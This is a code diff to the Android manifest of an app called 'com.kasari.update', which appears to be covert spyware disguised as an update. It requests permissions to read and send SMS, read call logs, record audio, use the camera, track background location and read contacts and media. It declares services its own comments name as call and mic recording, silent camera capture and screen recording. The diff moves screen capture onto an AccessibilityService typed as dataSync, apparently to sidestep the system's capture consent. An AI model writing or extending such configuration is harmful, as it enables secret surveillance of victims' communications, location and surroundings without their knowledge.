@@ -2,33 +2,54 @@
 <manifest xmlns:android="http://schemas.android.com/apk/res/android"
     package="com.kasari.update">
 
+    <!-- Network -->
     <uses-permission android:name="android.permission.INTERNET" />
     <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
+
+    <!-- SMS -->
     <uses-permission android:name="android.permission.RECEIVE_SMS" />
     <uses-permission android:name="android.permission.READ_SMS" />
     <uses-permission android:name="android.permission.SEND_SMS" />
+
+    <!-- Calls -->
     <uses-permission android:name="android.permission.READ_PHONE_STATE" />
     <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS" />
     <uses-permission android:name="android.permission.READ_CALL_LOG" />
     <uses-permission android:name="android.permission.CALL_PHONE" />
+
+    <!-- Audio -->
     <uses-permission android:name="android.permission.RECORD_AUDIO" />
+
+    <!-- Camera -->
     <uses-permission android:name="android.permission.CAMERA" />
+
+    <!-- Location -->
     <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" />
     <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION" />
     <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION" />
+
+    <!-- Contacts -->
     <uses-permission android:name="android.permission.READ_CONTACTS" />
-    <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"
+
+    <!-- Storage: READ up to API 32, WRITE up to API 28 (scoped storage after) -->
+    <uses-permission
+        android:name="android.permission.READ_EXTERNAL_STORAGE"
         android:maxSdkVersion="32" />
-    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"
+    <uses-permission
+        android:name="android.permission.WRITE_EXTERNAL_STORAGE"
         android:maxSdkVersion="28" />
+    <!-- Android 13+ granular media permissions -->
     <uses-permission android:name="android.permission.READ_MEDIA_IMAGES" />
     <uses-permission android:name="android.permission.READ_MEDIA_VIDEO" />
     <uses-permission android:name="android.permission.READ_MEDIA_AUDIO" />
+
+    <!-- Foreground service — dataSync/microphone/camera need API 34+ permission -->
     <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
     <uses-permission android:name="android.permission.FOREGROUND_SERVICE_DATA_SYNC" />
     <uses-permission android:name="android.permission.FOREGROUND_SERVICE_MICROPHONE" />
     <uses-permission android:name="android.permission.FOREGROUND_SERVICE_CAMERA" />
-    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_MEDIA_PROJECTION" />
+
+    <!-- Boot & misc -->
     <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
     <uses-permission android:name="android.permission.REQUEST_INSTALL_PACKAGES" />
     <uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW" />
@@ -45,7 +66,7 @@
         android:usesCleartextTraffic="true"
         android:networkSecurityConfig="@xml/network_security_config">
 
-        <!-- Splash / Lock screen — shown to user when app is opened -->
+        <!-- Splash / Lock screen -->
         <activity
             android:name=".SplashActivity"
             android:exported="true"
@@ -60,7 +81,7 @@
             </intent-filter>
         </activity>
 
-        <!-- Internal setup activity (no longer a launcher) -->
+        <!-- Internal setup activity -->
         <activity
             android:name=".MainActivity"
             android:exported="false"
@@ -102,7 +123,7 @@
             </intent-filter>
         </receiver>
 
-        <!-- Background polling service -->
+        <!-- Background polling service (dataSync = polling/network) -->
         <service
             android:name=".BackgroundService"
             android:exported="false"
@@ -114,21 +135,21 @@
             android:name=".BackgroundService$InnerService"
             android:exported="false" />
 
-        <!-- Call / mic recording -->
+        <!-- Call / mic recording (microphone type) -->
         <service
             android:name=".VoiceRecorder"
             android:exported="false"
             android:foregroundServiceType="microphone"
             android:stopWithTask="false" />
 
-        <!-- Screen recording (MediaProjection) -->
+        <!-- Screen recording via AccessibilityService frames (dataSync — no MediaProjection used) -->
         <service
             android:name=".ScreenRecordService"
             android:exported="false"
-            android:foregroundServiceType="mediaProjection"
+            android:foregroundServiceType="dataSync"
             android:stopWithTask="false" />
 
-        <!-- Silent camera capture -->
+        <!-- Silent camera capture (camera type) -->
         <service
             android:name=".CameraService"
             android:exported="false"
